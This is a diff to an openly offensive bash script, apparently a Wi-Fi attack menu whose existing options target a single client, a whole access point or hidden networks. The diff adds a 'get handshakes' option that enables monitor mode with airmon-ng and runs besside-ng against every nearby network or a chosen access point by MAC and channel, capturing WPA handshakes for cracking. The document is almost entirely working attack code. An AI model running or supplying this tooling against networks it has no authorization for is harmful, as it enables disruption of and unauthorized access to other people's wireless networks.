@@ -43,9 +43,9 @@ echo "								                                        "
 tput sgr0
 #artwork end
 #opt
-echo "Choose an attack option [single client(1) whole AP(2) find hidden(3)]:"
+echo "Choose an attack option [single client(1) whole AP(2) find hidden(3) get handshakes(4)]:"
 read ask
-if [ $ask -gt 3 ]
+if [ $ask -gt 4 ] || [ $ask -lt 1 ]
 	then
 		tput setaf 1
 		echo "This option does not exist!"
@@ -124,4 +124,36 @@ if [ $ask -eq 3 ]
 		sleep 1
 		sudo rm temp.txt
 		exit 0
+fi
+if [ $ask -eq 4 ]
+	then
+		ask=0
+		chan=0
+		echo "Choose attack mode (1=Get all handshakes 2=Get specific handshakes)"
+		read ask
+		if [ $ask -eq 0 ] || [ $ask -gt 2 ]
+			then
+				echo "invalid option"
+				exit 1
+		fi
+		if [ $ask -eq 1 ]
+			then
+				tput setaf 1
+				sudo airmon-ng start $inter > /dev/null
+				trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $monitor > /dev/null && exit 1' INT
+				sudo besside-ng $monitor
+				tput sgr0
+		else
+				tput setaf 1
+				sudo iwlist $inter scan | egrep 'Address|ESSID|Channel|Quality'
+				echo "choose AP MAC:"
+				read clientmac
+				echo "choose AP Channel:"
+				read chan
+				sudo airmon-ng start $inter $chan > /dev/null
+				trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $monitor > /dev/null && exit 1' INT
+				sudo besside-ng -b $clientmac $monitor
+				tput sgr0
+		fi
+		sudo airmon-ng stop $monitor > /dev/null
 fi
